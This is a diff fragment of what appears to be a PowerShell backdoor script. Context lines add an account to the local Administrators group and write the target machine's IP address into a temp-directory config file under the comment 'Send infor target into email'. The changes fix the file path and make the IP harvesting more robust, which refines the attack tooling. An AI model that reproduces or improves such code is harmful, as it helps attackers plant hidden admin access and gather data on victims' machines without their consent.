@@ -16,14 +16,12 @@ Add-LocalGroupMember -Group "Administrators" -Member $UserName
 $initial_dir = Get-Location
 $dirName = random_text
 $pathDir = $env:temp\$dirName
-$configfile = "$env:config.kAiZ3n"
+$configfile = "$env:TEMP\config.kAiZ3n"
 #Send infor target into email 
-$email = Get-Content email.txt
-$pword = Get-Content pass.txt
 if(Test-Path $configfile){
     Remove-Item $configfile -Force
 }
-$ip = (Get-NetIpAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
+$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.PrefixOrigin -eq "Dhcp" } | Select-Object -ExpandProperty IPAddress)
 
 #Write config file
 Add-Content -Path $configfile -Value $ip
